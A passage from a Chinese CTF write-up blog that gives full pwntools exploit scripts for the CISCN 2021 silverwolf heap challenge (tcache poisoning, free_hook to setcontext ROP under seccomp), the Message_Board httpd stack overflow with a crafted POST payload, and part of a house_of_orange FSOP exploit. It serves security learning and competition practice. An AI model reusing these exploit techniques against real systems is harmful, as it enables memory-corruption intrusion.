class="line">gdb.attach(p)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x78</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(free_hook))</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x78</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x78</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(system))</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x78</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">b&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="2021-11-25"><a href="#2021-11-25" class="headerlink" title="2021-11-25"></a>2021-11-25</h2><h3 id="CISCN-2021-初赛-silverwolf"><a href="#CISCN-2021-初赛-silverwolf" class="headerlink" title="[CISCN 2021 初赛]silverwolf"></a>[CISCN 2021 初赛]silverwolf</h3><p><a href="https://gitee.com/Nss-harukii/images/raw/master/silverwolf.zip">附件</a></p>
<h4 id="题目分析-4"><a href="#题目分析-4" class="headerlink" title="题目分析"></a>题目分析</h4><p>这道题是上到题的进阶版，在上一道题的基础上增加了一个沙盒</p>
<p>保护如下，要求只能使用orw,这意味着我们需要构造一条rop链来对flag文件进行读写</p>
<p><img src="https://gitee.com/Nss-harukii/images/raw/master/23.png" alt="pic"></p>
<p>那么和之前不同，这道题需要将劫持<code>free_hook</code> 为 <code>setcontext + 53</code> 来调用我们的ROP链</p>
<p>setcontext+53 如下：</p>
<p><img src="https://gitee.com/Nss-harukii/images/raw/master/24.png" alt="pic"></p>
<p>之所以会选择<code>setcontext + 53</code>而不是<code>setcontext</code> 是因为<code>fldenv[rcx]</code>指令会造成程序执行的时候直接crash，所以要避开这个指令。</p>
<p>利用<code>setcontext + 53</code>我们可以直接去控制寄存器的值从而控制程序执行流，就类似于我们在SROP中伪造SigFrame来控制程序执行流一样。 </p>
<p>接下来我们只需要在堆上布置好我们的rop链然后用<code>setcontext</code>去调用执行就好了</p>
<h4 id="解题步骤-3"><a href="#解题步骤-3" class="headerlink" title="解题步骤"></a>解题步骤</h4><h5 id="Step1-leak-libc"><a href="#Step1-leak-libc" class="headerlink" title="Step1 leak libc"></a>Step1 leak libc</h5><p>思路和上道题一模一样，唯一要注意的是在开启<code>seccomp</code>以后<code>seccomp_rule_add</code>和<code>seccomp_load</code>函数会影响tcache 和 fastbin的风水，所以一开始的堆布局如下</p>
<p><img src="https://gitee.com/Nss-harukii/images/raw/master/26.png" alt="pic"></p>
<p>在leak之前我们可以简单的恢复一下，以方便我们控制堆块<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">clean</span>():</span></span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0x78</span>)</span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">12</span>):</span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0x18</span>)</span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">14</span>):</span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0x68</span>)</span><br><span class="line">  add(<span class="number">0</span>,<span class="number">0x58</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">clean()</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;  </span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x28</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x28</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Content: &quot;</span>)</span><br><span class="line">heap_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>)) &amp; <span class="number">0xFFFFFFFFFFFFF000</span>-<span class="number">0x1000</span></span><br><span class="line">success(<span class="string">&quot;heap:&quot;</span> + <span class="built_in">hex</span>(heap_base))</span><br><span class="line">edit(<span class="number">0</span>,p64(heap_base+<span class="number">0x10</span>))</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x28</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x28</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0</span>)*<span class="number">4</span>+p64(<span class="number">0x7000000</span>))</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x3ebca0</span></span><br><span class="line">success(<span class="string">&quot;libc:&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">setcontext = libc_base + libc.sym[<span class="string">&#x27;setcontext&#x27;</span>] + <span class="number">53</span></span><br></pre></td></tr></table></figure></p>
<h5 id="Step2-修改tcache-control-head"><a href="#Step2-修改tcache-control-head" class="headerlink" title="Step2 修改tcache control head"></a>Step2 修改tcache control head</h5><p>由于此时的tcache被释放进unsorted bin后在原本这些tcache counts对应的地方被写入了main_arena_96的地址，所以我们要先恢复tcache counts。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0</span>,<span class="number">0x48</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0</span>)*<span class="number">9</span>)</span><br></pre></td></tr></table></figure>
<p>接下来需要申请到tcache control head</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x18</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(heap_base+<span class="number">0x50</span>))  <span class="comment"># 修改fd</span></span><br><span class="line">add(<span class="number">0x30</span>)</span><br></pre></td></tr></table></figure>
<p>最后修改tcache control head<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = p64(free_hook)                 <span class="comment">#18</span></span><br><span class="line">payload += p64(heap_base + <span class="number">0x2000</span>)       <span class="comment">#28   ./flag     rdi</span></span><br><span class="line">payload += p64(heap_base + <span class="number">0x20a0</span>)       <span class="comment">#38              rsp</span></span><br><span class="line">payload += p64(heap_base + <span class="number">0x2000</span>)       <span class="comment">#48    最后调用        </span></span><br><span class="line">payload += p64(heap_base + <span class="number">0x1000</span>)       <span class="comment">#58    rop part1</span></span><br><span class="line">payload += p64(<span class="number">0</span>)                        <span class="comment">#68</span></span><br><span class="line">payload += p64(heap_base + <span class="number">0x1000</span>+<span class="number">0x58</span>)  <span class="comment">#78    rop part2</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br></pre></td></tr></table></figure><br>这里要注意rop链的长度不能大于你可以控制的堆块的大小，这里我们最多可以写 0x58 + 0x68 + 0x78长度的链</p>
<h5 id="Step3-构造rop链"><a href="#Step3-构造rop链" class="headerlink" title="Step3 构造rop链"></a>Step3 构造rop链</h5><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># open</span></span><br><span class="line">rop = p64(pop_rdi_ret)+p64(flag_addr)</span><br><span class="line">rop += p64(pop_rsi_ret)+p64(<span class="number">0</span>)</span><br><span class="line">rop += p64(pop_rax_ret)+p64(<span class="number">2</span>)         </span><br><span class="line">rop += p64(syscall) </span><br><span class="line"><span class="comment"># read</span></span><br><span class="line">rop += p64(pop_rdi_ret)+p64(<span class="number">3</span>)</span><br><span class="line">rop += p64(pop_rsi_ret)+p64(flag_addr)</span><br><span class="line">rop += p64(pop_rdx_ret)+p64(<span class="number">0x30</span>)</span><br><span class="line">rop += p64(pop_rax_ret)+p64(<span class="number">0</span>)</span><br><span class="line">rop += p64(syscall)</span><br><span class="line"><span class="comment"># write</span></span><br><span class="line">rop += p64(pop_rdi_ret)+p64(<span class="number">1</span>)</span><br><span class="line">rop += p64(pop_rsi_ret)+p64(flag_addr)</span><br><span class="line">rop += p64(pop_rdx_ret)+p64(<span class="number">0x30</span>)</span><br><span class="line">rop += p64(pop_rax_ret)+p64(<span class="number">1</span>)</span><br><span class="line">rop += p64(syscall)</span><br></pre></td></tr></table></figure>
<h5 id="Step4-劫持free-hook-getshell"><a href="#Step4-劫持free-hook-getshell" class="headerlink" title="Step4 劫持free_hook getshell"></a>Step4 劫持free_hook getshell</h5><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0</span>,<span class="number">0x18</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(setcontext))  <span class="comment">## free_hook chang to setcontext+53</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x28</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">b&#x27;./flag\x00\x00&#x27;</span>)  <span class="comment">## ./flag in heap + 0x2000  -- rdi</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x38</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(heap_base + <span class="number">0x1000</span>) + p64(ret))  <span class="comment">## mov rsp , [rdi+0a0h]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## rop in heap+0x10000</span></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x58</span>)</span><br><span class="line">edit(<span class="number">0</span>,rop[:<span class="number">0x58</span>])</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x78</span>)</span><br><span class="line">edit(<span class="number">0</span>,rop[<span class="number">0x58</span>:])</span><br><span class="line"></span><br><span class="line"><span class="comment">## setcontext(rop)</span></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x48</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
<h4 id="完整exp-4"><a href="#完整exp-4" class="headerlink" title="完整exp"></a>完整exp</h4><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;silverwolf&quot;</span>)</span><br><span class="line"><span class="comment">#p = remote(&quot;1.14.71.254&quot;,28134)</span></span><br><span class="line">libc = ELF(<span class="string">&quot;libc-2.27.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choice</span>(<span class="params">choice</span>):</span></span><br><span class="line">  p.recvuntil(<span class="string">&quot;choice: &quot;</span>)</span><br><span class="line">  p.sendline(<span class="built_in">str</span>(choice))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">index,size</span>):</span></span><br><span class="line">  choice(<span class="number">1</span>)</span><br><span class="line">  p.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">  p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">  p.recvuntil(<span class="string">&quot;Size: &quot;</span>)</span><br><span class="line">  p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,content</span>):</span></span><br><span class="line">  choice(<span class="number">2</span>)</span><br><span class="line">  p.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">  p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">  p.recvuntil(<span class="string">&quot;Content: &quot;</span>)</span><br><span class="line">  p.sendline(content)</span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">  choice(<span class="number">3</span>)</span><br><span class="line">  p.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">  p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">  choice(<span class="number">4</span>)</span><br><span class="line">  p.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">  p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">clean</span>():</span></span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0x78</span>)</span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">12</span>):</span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0x18</span>)</span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">14</span>):</span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0x68</span>)</span><br><span class="line">  add(<span class="number">0</span>,<span class="number">0x58</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">clean()</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;  </span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x28</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x28</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Content: &quot;</span>)</span><br><span class="line">heap_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>)) &amp; <span class="number">0xFFFFFFFFFFFFF000</span>-<span class="number">0x1000</span></span><br><span class="line">success(<span class="string">&quot;heap:&quot;</span> + <span class="built_in">hex</span>(heap_base))</span><br><span class="line">edit(<span class="number">0</span>,p64(heap_base+<span class="number">0x10</span>))</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x28</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x28</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0</span>)*<span class="number">4</span>+p64(<span class="number">0x7000000</span>))</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x3ebca0</span></span><br><span class="line">success(<span class="string">&quot;libc:&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">setcontext = libc_base + libc.sym[<span class="string">&#x27;setcontext&#x27;</span>] + <span class="number">53</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x48</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0</span>)*<span class="number">9</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x18</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(heap_base+<span class="number">0x50</span>))</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x38</span>)</span><br><span class="line">payload = p64(free_hook) <span class="comment">#18</span></span><br><span class="line">payload += p64(heap_base + <span class="number">0x2000</span>) <span class="comment">#28   </span></span><br><span class="line">payload += p64(heap_base + <span class="number">0x20a0</span>) <span class="comment">#38      </span></span><br><span class="line">payload += p64(heap_base + <span class="number">0x2000</span>) <span class="comment">#48</span></span><br><span class="line">payload += p64(heap_base + <span class="number">0x1000</span>) <span class="comment">#58</span></span><br><span class="line">payload += p64(<span class="number">0</span>) <span class="comment">#68</span></span><br><span class="line">payload += p64(heap_base + <span class="number">0x1000</span>+<span class="number">0x58</span>)<span class="comment">#78</span></span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line"><span class="comment">#add(0,0x78)</span></span><br><span class="line"><span class="comment">#edit(0,p64(0)*12)</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#add(0,0x18)</span></span><br><span class="line">pop_rax_ret = libc_base+<span class="number">0x0000000000043ae8</span></span><br><span class="line">pop_rdi_ret = libc_base+<span class="number">0x00000000000215bf</span></span><br><span class="line">pop_rsi_ret = libc_base+<span class="number">0x0000000000023eea</span></span><br><span class="line">pop_rdx_ret = libc_base+<span class="number">0x0000000000001b96</span></span><br><span class="line">ret = libc_base+<span class="number">0x0000000000023eeb</span></span><br><span class="line">open1 = libc_base + libc.sym[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">read = libc_base + libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write = libc_base + libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">alarm = libc_base + libc.sym[<span class="string">&#x27;alarm&#x27;</span>]</span><br><span class="line">syscall = alarm+<span class="number">0x5</span></span><br><span class="line">flag_addr = heap_base+<span class="number">0x2000</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># rop chain</span></span><br><span class="line">rop = p64(pop_rdi_ret)+p64(flag_addr)</span><br><span class="line">rop += p64(pop_rsi_ret)+p64(<span class="number">0</span>)</span><br><span class="line">rop += p64(pop_rax_ret)+p64(<span class="number">2</span>)</span><br><span class="line">rop += p64(syscall)</span><br><span class="line">rop += p64(pop_rdi_ret)+p64(<span class="number">3</span>)</span><br><span class="line">rop += p64(pop_rsi_ret)+p64(flag_addr)</span><br><span class="line">rop += p64(pop_rdx_ret)+p64(<span class="number">0x30</span>)</span><br><span class="line">rop += p64(pop_rax_ret)+p64(<span class="number">0</span>)</span><br><span class="line">rop += p64(syscall)</span><br><span class="line">rop += p64(pop_rdi_ret)+p64(<span class="number">1</span>)</span><br><span class="line">rop += p64(pop_rsi_ret)+p64(flag_addr)</span><br><span class="line">rop += p64(pop_rdx_ret)+p64(<span class="number">0x30</span>)</span><br><span class="line">rop += p64(pop_rax_ret)+p64(<span class="number">1</span>)</span><br><span class="line">rop += p64(syscall)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x18</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(setcontext))  <span class="comment">## free_hook chang to setcontext+53</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x28</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">b&#x27;./flag\x00\x00&#x27;</span>)  <span class="comment">## ./flag in heap + 0x2000  -- rdi</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x38</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(heap_base + <span class="number">0x1000</span>) + p64(ret))  <span class="comment">## mov rsp , [rdi+0a0h]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## rop in heap+0x10000</span></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x58</span>)</span><br><span class="line">edit(<span class="number">0</span>,rop[:<span class="number">0x58</span>])</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x78</span>)</span><br><span class="line">edit(<span class="number">0</span>,rop[<span class="number">0x58</span>:])</span><br><span class="line"></span><br><span class="line"><span class="comment">## setcontext(rop)</span></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x48</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="2021-11-26"><a href="#2021-11-26" class="headerlink" title="2021-11-26"></a>2021-11-26</h2><h3 id="CISCN-Final-2021-Day2-Message-Board"><a href="#CISCN-Final-2021-Day2-Message-Board" class="headerlink" title="[CISCN Final 2021 Day2]Message_Board"></a>[CISCN Final 2021 Day2]Message_Board</h3><p><a href="https://gitee.com/Nss-harukii/images/raw/master/httpd">附件</a></p>
<p>这到题应该是Day2最简单的一道题，题目类型也是最近比较常见的webpwn，比较考研选手对栈溢出和对函数调用栈的过程的理解以及发现及利用漏洞的能力</p>
<h4 id="题目分析-5"><a href="#题目分析-5" class="headerlink" title="题目分析"></a>题目分析</h4><p>不同于大多数这种httpd的webpwn(如：湖湘杯的tiny_httpd,CISCN 的HMOS),通过目录穿越来造成漏洞,这道题将目录穿越限制的很死</p>
<p><img src="https://gitee.com/Nss-harukii/images/raw/master/33.png" alt="pic"></p>
<p>题目的漏洞点在这里</p>
<p><img src="https://gitee.com/Nss-harukii/images/raw/master/32.png" alt="pic"></p>
<p>如果message的最后一位不是<code>|</code>的话，那么就会—n , 而n又是等于content_len的,content_len又是我们可控的，所以我们可以让content_len等于0，然后—n就会等于0xffffff，从而导致在fread的时候栈溢出，而且刚好也能通过content_len的大小的检查。</p>
<p>那么我们如何通过这个溢出来getshell或是获取flag呢？</p>
<p>首先如果我们想要getshell就需要泄露出地址，而在本程序中所有读写函数(如：<code>fputs</code>)都是通过文件流去读写，这样使得我们难以泄露出地址，使得getshell变得十分困难</p>
<p>那么我们将思路转向读取flag,发现程序中有一个可以读取文件的函数</p>
<p><img src="https://gitee.com/Nss-harukii/images/raw/master/34.png" alt="pic"></p>
<p>而且在程序流程中也有调用，且参数我们可控</p>
<p><img src="https://gitee.com/Nss-harukii/images/raw/master/35.png" alt="pic"></p>
<p>那么我们将程序劫持到这里，然后设置[ebp+filename]的值为我们的文件名那我们就可以实现任意文件读取了</p>
<p>我们通过分析可以发现他会将我们输入的header存在bss段上的dest数组中，那么我们只需要将箭头指向的地方改为flag就可以去得到flag字符了</p>
<p><img src="https://gitee.com/Nss-harukii/images/raw/master/36.png" alt="pic"></p>
<p>最后，由于这个题目用的是fread,由于我们这里的n过大，他会一直不停的读stdin，有没有办法让他停止呢。</p>
<p>这就是我通过这个题新学到的一个点（参考自<a href="https://www.anquanke.com/post/id/248542">wjh师傅的博客</a>）:</p>
<pre><code>1.读入非常长的内容，直到 fgetc 传入的指针是错误的（超出栈空间，发生异常），这时候 fread 函数就会直接返回。
2.使用 sh.shutdown_raw(‘send’)来关闭输入管道，fread 函数就会返回，这个操作可见 VNCTF2021-WriteGiveFlag 这题的做法。
</code></pre><h4 id="解题步骤-4"><a href="#解题步骤-4" class="headerlink" title="解题步骤"></a>解题步骤</h4><p>本题的exp比较简单，这里就说一下我解题的时候遇到的一些问题吧（主要是我自己蠢了）</p>
<p>当我把程序劫持到<code>read_flag</code>时即0x80492BD的位置时，此时payload 如下，发现无法getshell<br><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*padding + p64(flag_addr) + p64(read_flag)</span><br></pre></td></tr></table></figure></p>
<p>然后动态调试发现</p>
<p><img src="https://gitee.com/Nss-harukii/images/raw/master/37.png" alt="pic"></p>
<p>这里将ebp减了0x42c，所以要将flag_addr + 0x42c才能读到flag</p>
<h4 id="完整exp-5"><a href="#完整exp-5" class="headerlink" title="完整exp"></a>完整exp</h4><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">elf = ELF(<span class="string">&#x27;./httpd&#x27;</span>)</span><br><span class="line">sh = process(<span class="string">&#x27;./httpd&#x27;</span>)</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">read_file = <span class="number">0x80492BD</span> </span><br><span class="line">flag_addr = <span class="number">0x0804C180</span> + <span class="number">0x21</span></span><br><span class="line">payload = <span class="string">b&#x27;POST /submit HTTP/1.1\r\n&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;Content-Length: 0\r\n&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;Cookie: Username=haruki;Messages=flag\r\n&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;\r\n&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x829</span>                 <span class="comment">##这里的padding是message到栈底的距离</span></span><br><span class="line">payload += p32(flag_addr +<span class="number">0x42c</span>) </span><br><span class="line">payload += p32(read_file)</span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.shutdown_raw(<span class="string">&#x27;send&#x27;</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="2021-11-27"><a href="#2021-11-27" class="headerlink" title="2021-11-27"></a>2021-11-27</h2><p>今日由于参加几场线上赛（坐牢）以及一些特殊情况暂停更新。</p>
<h2 id="2021-11-28"><a href="#2021-11-28" class="headerlink" title="2021-11-28"></a>2021-11-28</h2><h3 id="安洵杯-2021-ezheap"><a href="#安洵杯-2021-ezheap" class="headerlink" title="[安洵杯 2021]ezheap"></a>[安洵杯 2021]ezheap</h3><p><a href="https://gitee.com/Nss-harukii/images/raw/master/ezheap.zip">附件</a></p>
<p>昨天打了三场比赛，还是感觉到了一些大比赛和小杯赛的差距，昨天axb拿了一个二血一个三血，春秋杯和NCTF直接坐牢，看来自己还是经不住考验，刚好这道题昨天学弟在问，就写个wp吧。</p>
<h4 id="题目分析-6"><a href="#题目分析-6" class="headerlink" title="题目分析"></a>题目分析</h4><p>这道题是目前比少见的2.23的堆了，属于是一个简单题了</p>
<p><img src="https://gitee.com/Nss-harukii/images/raw/master/45.png" alt="pic"></p>
<p>程序一开始会直接送我们一个堆地址</p>
<p>漏洞点在edit函数这里，这里会重新输入一次size，可以造成堆溢出</p>
<p><img src="https://gitee.com/Nss-harukii/images/raw/master/46.png" alt="pic"></p>
<p>同时题目中没有free函数，又告诉了我们堆地址同时又有个堆溢出，那么利用思路就比较明显了，直接house_of_orange打IO结构体。关于house_of_orange的原理及利用，我在这篇<a href="https://hgg-bat.github.io/2021/10/04/house-of-orange/#more">笔记</a>中也写得比较详细。</p>
<h4 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h4><h5 id="Step1-get-gift"><a href="#Step1-get-gift" class="headerlink" title="Step1 get gift"></a>Step1 get gift</h5><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">p.recvuntil(<span class="string">&quot;0x&quot;</span>)</span><br><span class="line">heap_base = <span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)-<span class="number">0x10</span></span><br><span class="line">success(<span class="string">&quot;heap: &quot;</span>+ <span class="built_in">hex</span>(heap_base))</span><br></pre></td></tr></table></figure>
<h5 id="Step2-利用堆溢出修改top-chunk的大小，将top-chunk-free-进入unsorted-bin来leak-libc"><a href="#Step2-利用堆溢出修改top-chunk的大小，将top-chunk-free-进入unsorted-bin来leak-libc" class="headerlink" title="Step2 利用堆溢出修改top chunk的大小，将top chunk free 进入unsorted bin来leak libc"></a>Step2 利用堆溢出修改top chunk的大小，将top chunk free 进入unsorted bin来leak libc</h5><p>注意这里修改top chunk的时候要注意页对齐,比如说这里的top chunk的大小为0x20f91,linux分页是以0x1000为一页，那么我伪造的时候就要伪造top chunk的size为0xf91</p>
<p><img src="https://gitee.com/Nss-harukii/images/raw/master/47.png" alt="pic"></p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x40</span>+p64(<span class="number">0</span>)+p64(<span class="number">0xf91</span>)</span><br><span class="line">edit(<span class="built_in">len</span>(payload),payload)</span><br><span class="line">add(<span class="number">0x1000</span>,<span class="string">b&#x27;b&#x27;</span>)</span><br><span class="line">add(<span class="number">0x400</span>,<span class="string">b&#x27;c&#x27;</span>)</span><br><span class="line">show()</span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))-<span class="number">0x3b7a63</span></span><br><span class="line">success(<span class="string">&quot;libc: &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">system_addr = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">IO_list_all = libc_base + libc.symbols[<span class="string">&#x27;_IO_list_all&#x27;</span>]</span><br></pre></td></tr></table></figure>
<h5 id="Step3-FSOP"><a href="#Step3-FSOP" class="headerlink" title="Step3 FSOP"></a>Step3 FSOP</h5><p>这里具体怎么伪造IO_FILE以及为什么，我在这篇<a href="https://hgg-bat.github.io/2021/10/04/house-of-orange/#more">笔记</a>中也写的比较详细了</p>
